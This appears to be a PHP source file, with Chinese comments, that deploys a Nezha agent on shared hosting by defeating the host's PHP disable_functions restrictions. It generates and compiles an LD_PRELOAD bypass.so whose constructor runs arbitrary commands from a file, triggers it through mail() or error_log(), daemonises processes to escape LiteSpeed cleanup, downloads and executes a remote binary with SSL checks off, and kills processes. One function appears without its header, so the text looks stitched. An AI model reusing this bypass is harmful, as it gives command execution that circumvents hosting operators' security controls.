// ===== 基于当前 IP 临时生成 UUID =====
function computeUUIDByIP() {
    $ip = '';
    $ip = @gethostbyname(gethostname());
    if ($ip === gethostname()) $ip = '';
    if (empty($ip) && isset($_SERVER['SERVER_ADDR'])) $ip = $_SERVER['SERVER_ADDR'];
    if (empty($ip) && function_exists('curl_init')) {
        $ch = @curl_init('https://ifconfig.me');
        @curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER=>1, CURLOPT_TIMEOUT=>5, CURLOPT_USERAGENT=>'curl']);
        $r = @curl_exec($ch); @curl_close($ch);
        if ($r && filter_var(trim($r), FILTER_VALIDATE_IP)) $ip = trim($r);
    }
    if (empty($ip)) $ip = '127.0.0.1';
    $h = md5('nezha-' . $ip);
    $uuid = substr($h,0,8).'-'.substr($h,8,4).'-4'.substr($h,13,3).'-'.substr($h,16,4).'-'.substr($h,20,12);
    return ['ip'=>$ip, 'uuid'=>$uuid];
}

// ===== 稳定 UUID 获取 =====
function getStableUUID($uuidfile, $configfile) {
    if (file_exists($uuidfile)) {
        $u = trim(@file_get_contents($uuidfile));
        if (preg_match('/^[0-9a-fA-F-]{36}$/', $u)) return $u;
    }
    if (file_exists($configfile)) {
        $old = @file_get_contents($configfile);
        if (preg_match('/^uuid:\s*"?([0-9a-fA-F-]{36})"?/m', $old, $m)) {
            @file_put_contents($uuidfile, $m[1]);
            @chmod($uuidfile, 0600);
            return $m[1];
        }
    }
    $info = computeUUIDByIP();
    @file_put_contents($uuidfile, $info['uuid']);
    @chmod($uuidfile, 0600);
    return $info['uuid'];
}

function generateBypassCSource() {
    return <<<'C'
#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <signal.h>

/* v8.5 bypass.so - 适配 LiteSpeed + 严格 disable_functions 环境
 *
 * 关键改进：
 *   1. constructor 自己 fork + setsid，不依赖外部 setsid 命令
 *      → 解决 LiteSpeed 请求结束杀整个进程组的问题
 *      → 解决 posix_setsid 被 disable_functions 禁的问题（libc 函数不受影响）
 *   2. 子进程重定向 stdin/stdout/stderr 到 /dev/null 或日志文件
 *      → 完全脱离 PHP 的文件描述符
 *   3. 父进程立即返回，不等待子进程（不阻塞 mail()）
 *   4. 支持两种模式：
 *      - 长驻模式（NZ_DAEMON=1）：fork + setsid + exec，agent 永久脱离
 *      - 普通模式：fork + system，命令执行完子进程退出
 */

__attribute__((constructor))
void nezha_bypass(void) {
    const char *cmdfile = getenv("NZ_BYPASS_CMD");
    if (!cmdfile || access(cmdfile, R_OK) != 0) return;

    FILE *f = fopen(cmdfile, "r");
    if (!f) return;
    char cmd[8192] = {0};
    if (!fgets(cmd, sizeof(cmd)-1, f)) {
        fclose(f);
        return;
    }
    fclose(f);
    cmd[strcspn(cmd, "\n")] = 0;
    if (strlen(cmd) == 0) return;

    /* 清理环境变量，防止子进程再次触发 */
    unsetenv("LD_PRELOAD");
    unsetenv("NZ_BYPASS_CMD");

    const char *daemon_mode = getenv("NZ_DAEMON");

    /* 第一次 fork：让 child 成为孤儿进程，被 init 接管 */
    pid_t pid = fork();
    if (pid < 0) {
        /* fork 失败，fallback 直接 system（会阻塞 mail，但至少能跑） */
        system(cmd);
        return;
    }
    if (pid > 0) {
        /* parent：不等子进程，立即返回（避免阻塞 mail） */
        waitpid(pid, NULL, WNOHANG);
        return;
    }

    /* === child 进程 === */
    /* 创建新 session，脱离控制终端和进程组（关键！绕过 LiteSpeed 进程清理） */
    setsid();

    /* 忽略 SIGHUP（session leader 终止时不会发 SIGHUP 给我们） */
    signal(SIGHUP, SIG_IGN);

    /* 第二次 fork：彻底成为 daemon，不再是 session leader，永远不会再获取控制终端 */
    if (daemon_mode != NULL) {
        pid_t pid2 = fork();
        if (pid2 < 0) {
            /* 失败也继续，单 fork 已经够用 */
        } else if (pid2 > 0) {
            /* 中间进程退出 */
            _exit(0);
        }
    }

    /* 重定向 stdin/stdout/stderr 到 /dev/null */
    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, 0);
        dup2(devnull, 1);
        dup2(devnull, 2);
        if (devnull > 2) close(devnull);
    }

    /* 执行命令：用 system() 走 /bin/sh，支持 shell 语法（重定向、管道、&） */
    int rc = system(cmd);

    /* 子进程退出 */
    _exit(WIFEXITED(rc) ? WEXITSTATUS(rc) : 1);
}
C;
}

    // 没有命令执行能力就不写 .c 文件（避免用户看到自动生成的 .c）
    if (empty($EXEC_METHODS)) return ['ok'=>false, 'msg'=>'无命令执行能力，无法 gcc 编译'];
    $c_path = $so_path . '.c'; $c_source = generateBypassCSource();
    if (@file_put_contents($c_path, $c_source) === false) return ['ok'=>false, 'msg'=>'C 源码写入失败'];
    $r = runCmd("gcc -shared -fPIC -o ".escapeshellarg($so_path)." ".escapeshellarg($c_path)." -nostartfiles 2>&1");
    @unlink($c_path);  // 始终清理 .c 临时文件（无论编译成功失败）
    if (file_exists($so_path) && filesize($so_path) > 1000) { @chmod($so_path, 0600); return ['ok'=>true, 'msg'=>'gcc 编译成功']; }
    return ['ok'=>false, 'msg'=>'gcc 编译失败: '.$r['output']];
}

function ensureBypassSo($so_path) {
    if (file_exists($so_path) && filesize($so_path) > 1000) return ['ok'=>true, 'msg'=>'bypass.so 已存在'];
    $r = downloadBypassSo($so_path); if ($r['ok']) return $r;
    $r = compileBypassSo($so_path); if ($r['ok']) return $r;
    // 下载和编译均失败 → 写 .c 源码让用户本地编译后上传
    $c_path = $so_path . '.c'; $c_source = generateBypassCSource();
    @file_put_contents($c_path, $c_source);
    return ['ok'=>false, 'msg'=>"下载和编译均失败，C 源码已写入: $c_path\n本地编译命令: gcc -shared -fPIC -o $so_path $c_path -nostartfiles\n编译后请上传 .so 到 .stfp/ 目录"];
}

function ldPreloadExec($cmd, $so_path, $cmdfile, $daemon = false) {
    global $FUNC, $LOGFILE;
    if (empty($FUNC['putenv']['works'])) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'putenv不可用', 'so_loaded'=>false];
    if (empty($FUNC['mail']['works']) && empty($FUNC['error_log']['works'])) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'mail和error_log均不可用', 'so_loaded'=>false];
    if (!file_exists($so_path) || filesize($so_path) < 1000) return ['output'=>'', 'code'=>-1, 'method'=>'ld_preload', 'error'=>'bypass.so不存在', 'so_loaded'=>false];

    // v8.6：marker 机制 - 让 bypass.so 写一个标记文件，PHP 检测它是否存在
    // 这样能明确判断 .so 是否真的被加载
    $marker = dirname($cmdfile) . '/.nezha_marker_' . time() . '_' . mt_rand(1000, 9999);
    @unlink($marker);  // 清理可能残留的 marker

    // 1. 将命令写入文件
    @file_put_contents($cmdfile, $cmd . "\n"); @chmod($cmdfile, 0600);

    // 2. 设置环境变量
    @putenv("NZ_BYPASS_CMD=" . $cmdfile);
    @putenv("LD_PRELOAD=" . $so_path);
    @putenv("NZ_MARKER=" . $marker);
    @putenv("NZ_LOGFILE=" . $LOGFILE);  // v8.6: bypass.so 写日志到主日志文件
    if ($daemon) {
        @putenv("NZ_DAEMON=1");
    } else {
        @putenv("NZ_DAEMON=");
    }

    // 3. 触发子进程
    $trigger = '';
    $mail_fork_happened = false;
    if (!empty($FUNC['mail']['works'])) {
        // v8.11a: 不调 mail()（这台主机 LD_PRELOAD 不工作，调 mail 只会产生僵尸 sh）
        $trigger = 'mail(disabled)';
        // 给 fork 一点时间
        usleep(200000);  // 0.2 秒
        // 检查 marker
        $mail_fork_happened = file_exists($marker);
    } elseif (!empty($FUNC['error_log']['works'])) {
        @error_log("x", 1, "a@b.com", "");
        $trigger = 'error_log';
        usleep(200000);
        $mail_fork_happened = file_exists($marker);
    }

    // 4. 检查 marker（再等一会儿，确保 .so 有时间写）
    if (!$mail_fork_happened) {
        usleep(500000);  // 再等 0.5 秒
        $mail_fork_happened = file_exists($marker);
    }
    $so_loaded = $mail_fork_happened;
    if ($so_loaded) {
        @unlink($marker);
    }

    // 5. 立即清理环境变量
    @putenv("LD_PRELOAD=");
    @putenv("NZ_BYPASS_CMD=");
    @putenv("NZ_DAEMON=");
    @putenv("NZ_MARKER=");
    @putenv("NZ_LOGFILE=");
    @unlink($cmdfile);
    if (file_exists($marker)) @unlink($marker);

    return ['output'=>'', 'code'=>$so_loaded?0:-1, 'method'=>'ld_preload('.$trigger.($daemon?'+daemon':'').')', 'so_loaded'=>$so_loaded];
}

// ================================================================
//  四、通用命令执行（自动降级 + LD_PRELOAD 兜底）
// ================================================================

function runCmd($cmd, $timeout=30) {
    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE;
    $output=''; $code=-1; $used='none';

    foreach ($EXEC_METHODS as $m) {
        if ($m === 'proc_open') {
            $d=[0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $p=@proc_open($cmd,$d,$pipes);
            if (is_resource($p)) {
                fclose($pipes[0]); $stdout=stream_get_contents($pipes[1]); $stderr=stream_get_contents($pipes[2]);
                fclose($pipes[1]); fclose($pipes[2]); $code=proc_close($p);
                $output=$stdout.($stderr?"\n[stderr] $stderr":''); $used='proc_open'; break;
            }
        } elseif ($m === 'popen') {
            $fp=@popen($cmd.' 2>&1','r');
            if ($fp) { $output=''; while(!feof($fp)) $output.=fread($fp,4096); $code=pclose($fp); $used='popen'; break; }
        } elseif ($m === 'exec') {
            $lines=[]; @exec($cmd." 2>&1",$lines,$code); $output=implode("\n",$lines); $used='exec'; break;
        } elseif ($m === 'shell_exec') {
            $output=@shell_exec($cmd." 2>&1"); $code=$output?0:1; $used='shell_exec'; break;
        } elseif ($m === 'system') {
            ob_start(); @system($cmd." 2>&1",$code); $output=ob_get_clean(); $used='system'; break;
        } elseif ($m === 'passthru') {
            ob_start(); @passthru($cmd." 2>&1",$code); $output=ob_get_clean(); $used='passthru'; break;
        }
    }

    // LD_PRELOAD 兜底
    if ($used === 'none' && $LD_PRELOAD_AVAILABLE) {
        $r = ldPreloadExec($cmd, $BYPASS_SO, $CMDFILE);
        if (!empty($r['method']) && $r['method'] === 'ld_preload') {
            $output = $r['output']; $code = $r['code']; $used = 'ld_preload';
        }
    }

    return ['output'=>trim($output), 'code'=>$code, 'method'=>$used];
}

function downloadBinary($script_dir, $arch='amd64') {
    global $EXEC_METHODS, $FUNC;
    $agent = "$script_dir/.nezha_agent"; $zip = "$script_dir/.nezha_download.zip"; $log = [];
    $urls = [
        "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{$arch}.zip",
        "https://ghgo.xyz/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{$arch}.zip",
        "https://mirror.ghproxy.com/https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{$arch}.zip",
    ];
    $downloaded = false;
    if (!$downloaded && !empty($FUNC['curl_init']['works'])) {
        foreach ($urls as $url) {
            $log[] = "[PHP curl] 尝试: $url";
            $ch = @curl_init($url); $fp = @fopen($zip, 'w+');
            if (!$ch || !$fp) { if($ch) curl_close($ch); if($fp) fclose($fp); continue; }
            @curl_setopt_array($ch, [CURLOPT_FILE=>$fp, CURLOPT_TIMEOUT=>120, CURLOPT_CONNECTTIMEOUT=>15, CURLOPT_FOLLOWLOCATION=>true, CURLOPT_SSL_VERIFYPEER=>false, CURLOPT_USERAGENT=>'Mozilla/5.0']);
            $r = @curl_exec($ch); $http = @curl_getinfo($ch, CURLINFO_HTTP_CODE); @curl_close($ch); @fclose($fp);
            if ($r && $http>=200 && $http<400 && file_exists($zip) && filesize($zip)>100000) { $downloaded = true; $log[] = "[PHP curl] 成功"; break; }
            @unlink($zip); $log[] = "[PHP curl] 失败";
        }
    }
    if (!$downloaded && !empty($EXEC_METHODS)) {
        foreach ($urls as $url) {
            $log[] = "[shell curl] $url"; $r = runCmd("curl -sSL '$url' -o '$zip' --connect-timeout 15 --max-time 120 2>&1");
            if (file_exists($zip) && filesize($zip)>100000) { $downloaded = true; $log[] = "[shell curl] 成功"; break; }
            @unlink($zip); $log[] = "[shell curl] 失败";
        }
    }
    if (!$downloaded) return ['ok'=>false, 'msg'=>"下载失败\n".implode("\n",$log)];

    $extracted = false;
    if (!$extracted && !empty($FUNC['ZipArchive']['works'])) {
        $log[] = "[ZipArchive] 解压..."; $za = new ZipArchive();
        if ($za->open($zip) === true) {
            for ($i=0; $i<$za->numFiles; $i++) { $name = $za->getNameIndex($i);
                if (strpos(basename($name), 'nezha-agent') === 0) { $fp = $za->getStream($name);
                    if ($fp) { $out = fopen($agent, 'w'); while (!feof($fp)) fwrite($out, fread($fp, 8192)); fclose($out); fclose($fp); $extracted = true; } } }
            $za->close();
        }
        $log[] = $extracted ? '[ZipArchive] 成功' : '[ZipArchive] 失败';
    }
    if (!$extracted && !empty($EXEC_METHODS)) {
        $log[] = "[shell unzip]..."; runCmd("cd '$script_dir' && unzip -o '$zip' 2>&1");
        if (file_exists("$script_dir/nezha-agent")) { @rename("$script_dir/nezha-agent", $agent); $extracted = true; }
    }
    @unlink($zip);
    if ($extracted) { @chmod($agent, 0700); return ['ok'=>true, 'msg'=>"成功\n".implode("\n",$log)]; }
    else return ['ok'=>false, 'msg'=>"解压失败\n".implode("\n",$log)];
}

// v8.10 新增：检测 ulimit -u，必要时清理同账号残留进程
// 返回 ['limit' => 数字, 'current' => 数字, 'cleaned' => int, 'msg' => string]
function _checkAndCleanupUlimit($agent) {
    $info = ['limit' => 0, 'current' => 0, 'cleaned' => 0, 'msg' => ''];

    // 1. 获取 ulimit -u（max user processes）
    $ulimit_u = 0;
    if (is_readable('/proc/self/limits')) {
        $limits = @file_get_contents('/proc/self/limits');
        if (preg_match('/Max processes.*?(\d+)/', $limits, $m)) {
            $ulimit_u = intval($m[1]);
        }
    }
    if (!$ulimit_u && !empty($GLOBALS['EXEC_METHODS'])) {
        $r = runCmd("ulimit -u 2>/dev/null");
        if (is_numeric(trim($r['output']))) $ulimit_u = intval(trim($r['output']));
    }
    $info['limit'] = $ulimit_u;

    // 2. 获取当前进程数
    $current_procs = 0;
    if (is_dir('/proc') && is_readable('/proc')) {
        $my_uid = function_exists('posix_getuid') ? @posix_getuid() : 0;
        foreach (@scandir('/proc') ?: [] as $pd) {
            if (!is_numeric($pd) || $pd < 1) continue;
            if ($my_uid) {
                $stat = @file_get_contents("/proc/$pd/status");
                if ($stat && preg_match('/Uid:\s*(\d+)/', $stat, $m) && intval($m[1]) === $my_uid) {
                    $current_procs++;
                }
            } else {
                $current_procs++;
            }
        }
    }
    $info['current'] = $current_procs;

    // 3. 判断是否需要清理
    // Go 运行时最少需要 4 个 OS 线程，预留 8 个比较安全
    $needed = 8;
    if ($ulimit_u > 0 && ($ulimit_u - $current_procs) < $needed) {
        // 需要清理：找到所有非当前的 nezha_agent / run.sh 残留进程
        $cleaned = 0;
        $agent_dir = dirname($agent);
        if (is_dir('/proc') && is_readable('/proc')) {
            $my_pid = getmypid();
            foreach (@scandir('/proc') ?: [] as $pd) {
                if (!is_numeric($pd) || $pd < 1 || $pd == $my_pid) continue;
                $cl = @file_get_contents("/proc/$pd/cmdline");
                if (!$cl) continue;
                // 匹配 agent 本身或 run.sh（不是当前 PHP）
                if (strpos($cl, '.nezha_agent') !== false
                    || strpos($cl, 'nezha-agent') !== false
                    || (strpos($cl, 'run.sh') !== false && strpos($cl, $agent_dir) !== false)) {
                    // 通过 LD_PRELOAD 或 shell kill 杀掉
                    if (!empty($GLOBALS['EXEC_METHODS'])) {
                        @runCmd("kill -9 $pd 2>/dev/null");
                    } elseif (!empty($GLOBALS['LD_PRELOAD_AVAILABLE']) && file_exists($GLOBALS['BYPASS_SO'])) {
                        ldPreloadExec("kill -9 $pd", $GLOBALS['BYPASS_SO'], $GLOBALS['CMDFILE']);
                    }
                    $cleaned++;
                }
            }
        }
        $info['cleaned'] = $cleaned;
        $info['msg'] = "ulimit={$ulimit_u}, current={$current_procs}, cleaned={$cleaned} stale procs";
    } else {
        $info['msg'] = $ulimit_u > 0
            ? "ulimit={$ulimit_u}, current={$current_procs} (OK)"
            : "ulimit unknown, current={$current_procs}";
    }

    return $info;
}

function launchDirect($agent, $config, $logfile) {
    global $EXEC_METHODS, $LD_PRELOAD_AVAILABLE, $BYPASS_SO, $CMDFILE, $FUNC;
    if (!file_exists($agent)) return ['ok'=>false, 'msg'=>'二进制不存在'];
    if (!is_executable($agent)) @chmod($agent, 0700);

    // v8.10: 优化 Go 环境变量，减少 OS 线程数（适配 ulimit -u 严格的共享主机）
    // GOMAXPROCS=1: 只用 1 个 CPU 核心，减少调度线程
    // GOMEMLIMIT=128MiB: 限制内存，减少 GC 压力
    // GODEBUG=asyncpreemptoff=1: 关闭异步抢占（减少信号处理线程）
    // GOGC=200: 降低 GC 频率（默认 100，改为 200 减少 GC 线程活动）
    $env_prefix = 'env GOMAXPROCS=1 GOMEMLIMIT=128MiB GODEBUG=asyncpreemptoff=1 GOGC=200 ';

    // v8.10: 启动前检测 ulimit -u，如果太低就提前清理同账号残留进程
    $ulimit_info = _checkAndCleanupUlimit($agent);

    // v8.5: agent 启动命令（不依赖 setsid 命令，bypass.so 会自己 setsid）
    $agent_cmd = $env_prefix . escapeshellarg($agent) . ' -c ' . escapeshellarg($config)
               . ' </dev/null >> ' . escapeshellarg($logfile) . ' 2>&1';

    $tried = [];

    // ========== 优先策略：如果 shell 执行被全禁，直接走 LD_PRELOAD ==========
    // 你的环境：exec/system/passthru/shell_exec/proc_open/popen 全禁
    // → 只能靠 LD_PRELOAD（putenv + mail 都可用）
    if (empty($EXEC_METHODS)) {
        if (!$LD_PRELOAD_AVAILABLE) {
            return ['ok'=>false, 'msg'=>'❌ 所有 shell 执行函数被禁且 LD_PRELOAD 不可用。需要 putenv + mail/error_log 函数可用'];
        }
        if (!file_exists($BYPASS_SO) || filesize($BYPASS_SO) < 1000) {
            return ['ok'=>false, 'msg'=>'❌ bypass.so 未就绪，请先点「🔧 准备绕过环境」按钮（自动下载/编译 .so）'];
        }

        // 用 daemon 模式启动 agent
        // bypass.so 会：fork → setsid → 二次 fork → 重定向 fd → system(agent_cmd &)
        // 这样 agent 完全脱离 PHP 进程组，LiteSpeed 杀不到
        $tried[] = 'ld_preload+daemon';
        ldPreloadExec($agent_cmd, $BYPASS_SO, $CMDFILE, true);
        sleep(3);  // 等 fork + setsid + agent 启动
        if (_checkProcAfterStart($agent)) {
            return ['ok'=>true, 'msg'=>'✅ LD_PRELOAD+daemon 启动成功（bypass.so 内部 fork+setsid 脱离 PHP）'];
        }

        // 备用：非 daemon 模式（单次 fork）
        $tried[] = 'ld_preload+single';
        ldPreloadExec($agent_cmd . ' &', $BYPASS_SO, $CMDFILE, false);
        sleep(3);
        if (_checkProcAfterStart($agent)) {
            return ['ok'=>true, 'msg'=>'✅ LD_PRELOAD 单 fork 启动成功'];
        }

        return ['ok'=>false, 'msg'=>'LD_PRELOAD 启动失败: '.implode(', ', $tried).'
可能原因：
1. bypass.so 版本太旧（v8.5 需要新版 .so，点「🔧 准备绕过环境」重新下载）
2. /proc 不可读，无法检测进程（实际可能已启动）
3. agent 二进制本身有问题（点「🚀 试运行」看输出）'];
    }

    // ========== 有 shell 执行能力时，走 v8.4 的 setsid 命令 ==========
    $detached_cmd = "setsid bash -c " . escapeshellarg($agent_cmd . ' & echo $!') . " </dev/null >> /dev/null 2>&1";
    $legacy_cmd = 'nohup ' . $env_prefix . $agent . ' -c ' . escapeshellarg($config) . ' >> ' . escapeshellarg($logfile) . ' 2>&1 &';

    if (in_array('proc_open', $EXEC_METHODS)) {
        $tried[] = 'proc_open+setsid';
        $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $p = @proc_open($detached_cmd, $d, $pipes);
        if (is_resource($p)) {
            fclose($pipes[0]);
            $pid_out = '';
            $start = microtime(true);
            while ((microtime(true) - $start) < 1.5) {
                $chunk = @fread($pipes[1], 1024);
                if ($chunk) $pid_out .= $chunk;
                if (strpos($pid_out, "\n") !== false) break;
                usleep(50000);
            }
            fclose($pipes[1]); fclose($pipes[2]); @proc_close($p);

            $pid = trim($pid_out);
            if (is_numeric($pid) && $pid > 0) {
                @file_put_contents(dirname($agent) . '/.nezha_pid', $pid);
                @chmod(dirname($agent) . '/.nezha_pid', 0600);
            }

            sleep(2);
            if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>"proc_open+setsid 成功 (PID=$pid)"];
        }

        $tried[] = 'proc_open+nohup';
        $p = @proc_open($legacy_cmd, $d, $pipes);
        if (is_resource($p)) { fclose($pipes[0]); sleep(3); @proc_close($p); if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'proc_open+nohup 成功']; }
    }
    if (in_array('popen', $EXEC_METHODS)) {
        $tried[] = 'popen+setsid';
        $fp = @popen($detached_cmd, 'r');
        if ($fp) { $pid_out = @fread($fp, 1024); @pclose($fp); sleep(2); if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'popen+setsid 成功']; }
    }
    if (in_array('exec', $EXEC_METHODS)) {
        $tried[] = 'exec+setsid';
        @exec($detached_cmd, $out, $code);
        sleep(2);
        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'exec+setsid 成功'];
    }
    if (in_array('shell_exec', $EXEC_METHODS)) {
        $tried[] = 'shell_exec+setsid';
        @shell_exec($detached_cmd);
        sleep(2);
        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'shell_exec+setsid 成功'];
    }

    // LD_PRELOAD 兜底
    if ($LD_PRELOAD_AVAILABLE && file_exists($BYPASS_SO) && filesize($BYPASS_SO) > 1000) {
        $tried[] = 'ld_preload+daemon';
        ldPreloadExec($agent_cmd, $BYPASS_SO, $CMDFILE, true);
        sleep(3);
        if (_checkProcAfterStart($agent)) return ['ok'=>true, 'msg'=>'LD_PRELOAD+daemon 启动成功'];
    }

    // v8.10: 失败时附加 ulimit 诊断信息
    $err_msg = '所有方式均失败: '.implode(', ', $tried);
    $err_msg .= "\n\n--- v8.10 ulimit 诊断 ---";
    $err_msg .= "\n" . $ulimit_info['msg'];
    if ($ulimit_info['limit'] > 0 && $ulimit_info['limit'] < 50) {
        $err_msg .= "\n❌ ulimit -u 太低 ({$ulimit_info['limit']})，Go 运行时启动需要至少 8 个进程槽位";
        $err_msg .= "\n   解决方案：";
        $err_msg .= "\n   ① 联系主机商提高 ulimit -u（推荐 ≥100）";
        $err_msg .= "\n   ② cPanel 用户：在 cPanel → Software → Multiphp INI Editor 查看是否可调";
        $err_msg .= "\n   ③ 用 .htaccess 加 'RLimitMem' 指令试试（不一定生效）";
        $err_msg .= "\n   ④ 换主机（这是最根本的解决方法）";
    } elseif ($ulimit_info['limit'] > 0 && ($ulimit_info['limit'] - $ulimit_info['current']) < 8) {
        $err_msg .= "\n⚠️ 进程槽位不足，已清理 {$ulimit_info['cleaned']} 个残留进程";
        $err_msg .= "\n   建议再点一次「▶ 启动」试试";
    }
    $err_msg .= "\n（也可能是 LiteSpeed 强杀了进程，请用「自动保活」按钮）";

    return ['ok'=>false, 'msg'=>$err_msg];
}

// v8.4 新增：启动后立即检测，找到 PID 写入 PID 文件
// 启动场景下 PID 文件可能还没写，所以只看 /proc 遍历
function _checkProcAfterStart($agent) {
    if (!is_dir('/proc') || !is_readable('/proc')) return false;
    $found_pid = 0;
    foreach (@scandir('/proc') ?: [] as $pd) {
        if (!is_numeric($pd) || $pd<1) continue;
        $cl = @file_get_contents("/proc/$pd/cmdline");
        if ($cl && (strpos($cl, '.nezha_agent') !== false || strpos($cl, 'nezha-agent') !== false)) {
            $found_pid = $pd;
            break;
        }
    }
    if ($found_pid > 0) {
        // 把 PID 写入 PID 文件，方便后续 detectProcess 用方法1验证
        $pidfile = dirname($agent) . '/.nezha_pid';
        @file_put_contents($pidfile, $found_pid);
        @chmod($pidfile, 0600);
        return true;
    }
    return false;
}

function _checkProc($agent) {
    // 方法1: /proc 遍历
    if (is_dir('/proc') && is_readable('/proc')) {
        foreach (@scandir('/proc') ?: [] as $pd) {
            if (!is_numeric($pd) || $pd<1) continue;
            $cl = @file_get_contents("/proc/$pd/cmdline");
            if ($cl && (strpos($cl, '.nezha_agent') !== false || strpos($cl, 'nezha-agent') !== false)) return true;
        }
    }
    // 方法2: 日志文件检测（v8.2 收紧到 10s + 要求 PID 文件存在）
    // agent 不持续写日志，30s 窗口在并发场景会误判
    $logfile = dirname($agent) . '/.nezha_log';
    $pidfile = dirname($agent) . '/.nezha_pid';
    if (file_exists($logfile) && filesize($logfile) > 0 && file_exists($pidfile)) {
        clearstatcache(true, $logfile);
        $mtime = @filemtime($logfile);
        if ($mtime && (time() - $mtime) < 10) return true;
    }
    return false;
}

// ================================================================
//  七、进程检测
// ================================================================

function detectProcess($agent, $pidfile) {
    $info = ['running'=>false, 'pids'=>[], 'pid_file'=>'-', 'method'=>'', 'detail'=>'未检测到', 'debug'=>''];
    $logfile = dirname($agent) . '/.nezha_log';

    // === 方法1: PID 文件 + /proc 验证 ===
    if (file_exists($pidfile)) {
        $pid = trim(file_get_contents($pidfile)); $info['pid_file'] = $pid;
        if (is_numeric($pid) && $pid>0) {
            if (is_dir("/proc/$pid") && is_readable("/proc/$pid/cmdline")) {
                $cl = @file_get_contents("/proc/$pid/cmdline");
                if ($cl && (strpos($cl, '.nezha_agent')!==false || strpos($cl, 'nezha-agent')!==false)) {
                    $info['running']=true; $info['pids'][]=$pid; $info['method']='PID+/proc'; $info['detail']="PID $pid 存活"; return $info;
                }
                $info['debug'] = "PID文件有PID=$pid 但cmdline不匹配: ".bin2hex(substr($cl,0,80));
            } else {
                $info['debug'] = "PID文件有PID=$pid 但/proc不可读";
            }
        }
    }

    // === 方法2: /proc 遍历 ===
    if (!$info['running'] && is_dir('/proc') && is_readable('/proc')) {
        foreach (@scandir('/proc') ?: [] as $pd) {
            if (!is_numeric($pd) || $pd<1) continue;
            $cl = @file_get_contents("/proc/$pd/cmdline");
            if ($cl && (strpos($cl, '.nezha_agent')!==false || strpos($cl, 'nezha-agent')!==false)) {
                $info['running']=true; $info['pids'][]=$pd; if (!$info['method']) $info['method']='/proc遍历'; $info['detail']="PID=$pd";
            }
        }
        if (!$info['running'] && empty($info['debug'])) {
            $info['debug'] = '/proc可读但未找到nezha进程(可能权限不足只能看自己的)';
        }
    } elseif (!$info['running'] && empty($info['debug'])) {
        $info['debug'] = '/proc不可读';
    }

    // === 方法3: shell pgrep ===
    if (!$info['running'] && !empty($GLOBALS['EXEC_METHODS'])) {
        $chk = runCmd("pgrep -f '.nezha_agent' 2>/dev/null");
        $pids = array_filter(explode("\n", trim($chk['output'])));
        // 【修复】pgrep 可能匹配到其他用户的 nezha 进程，必须二次验证
        foreach ($pids as $pid) {
            $pid = trim($pid);
            if (!is_numeric($pid) || $pid < 1) continue;
            // 二次验证：检查 /proc/PID/cmdline 或 /proc/PID/exe 是否指向当前 agent
            $verified = false;
            if (is_readable("/proc/$pid/cmdline")) {
                $cl = @file_get_contents("/proc/$pid/cmdline");
                // 检查 cmdline 是否包含当前 agent 的完整路径
                if ($cl && (strpos($cl, $agent) !== false || strpos($cl, '.nezha_agent') !== false)) {
                    $verified = true;
                }
            }
            // 如果 /proc 不可读，检查 exe 链接
            if (!$verified && is_readable("/proc/$pid/exe")) {
                $exe = @readlink("/proc/$pid/exe");
                if ($exe && strpos($exe, '.nezha_agent') !== false) {
                    $verified = true;
                }
            }
            if ($verified) {
                $info['running'] = true;
                $info['pids'][] = $pid;
                if (!$info['method']) $info['method'] = 'pgrep+验证';
            }
        }
        if (!$info['running'] && !empty($pids)) {
            $info['debug'] = 'pgrep 找到 '.count($pids).' 个 PID 但验证均失败（可能是其他用户的 nezha 进程）';
        }
    }

    // === 方法4: 日志文件活跃度检测（v8.2 收紧阈值） ===
    // 注意：nezha agent 不持续写日志，只在启动/出错时写一行
    //       所以 60s 窗口太宽，刚启动 agent 后 60s 内点别的按钮也会误判
    //       收紧到 15s + 同时要求 PID 文件存在（双重验证）
    if (!$info['running'] && file_exists($logfile) && filesize($logfile) > 0) {
        clearstatcache(true, $logfile);
        $mtime = @filemtime($logfile);
        $age = $mtime ? (time() - $mtime) : 9999;
        // 只在 PID 文件存在 + 日志 15s 内有更新时才判定运行（双重验证避免误判）
        if ($mtime && $age < 15 && file_exists($pidfile)) {
            $info['running'] = true;
            $info['pids'][] = '(via logs)';   // 占位 PID
            $info['method'] = '日志活跃度';
            $info['detail'] = "日志 ${age}s 前更新且 PID 文件存在 (agent 可能在运行)";
        } elseif ($mtime) {
            $info['detail'] = "日志 ${age}s 前更新 (可能已停止)";
        }
    }

    // === 方法5: 哪吒服务器 gRPC 连通性检测（v8.2 修复误判） ===
    // 旧实现 BUG：只要 /proc/net/tcp 里有任意 :01BB 行（state=01）就判定 agent 在跑
    //   但本 PHP 走 HTTPS/443 时，浏览器 ↔ LiteSpeed 的 ESTABLISHED 连接也是 :01BB state=01
    //   → 用户只要打开面板就误判 agent 在跑（用户报告的 BUG）
    // 修复思路：必须解析 nezha server hostname → IP，只匹配 rem_address = 该 IP 的 ESTABLISHED 行
    if (!$info['running']) {
        $nz_server = '';
        if (file_exists(dirname($agent) . '/.nezha_config')) {
            $cfg = @file_get_contents(dirname($agent) . '/.nezha_config');
            if (preg_match('/^server:\s*"?([^"\s]+)"?/m', $cfg, $m)) $nz_server = $m[1];
        }
        if ($nz_server) {
            $parts = explode(':', $nz_server);
            $host = $parts[0];
            $port = isset($parts[1]) ? intval($parts[1]) : 5555;
            if (is_readable('/proc/net/tcp')) {
                // 1. 把 nezha server hostname 解析成 IPv4
                $ip = @gethostbyname($host);
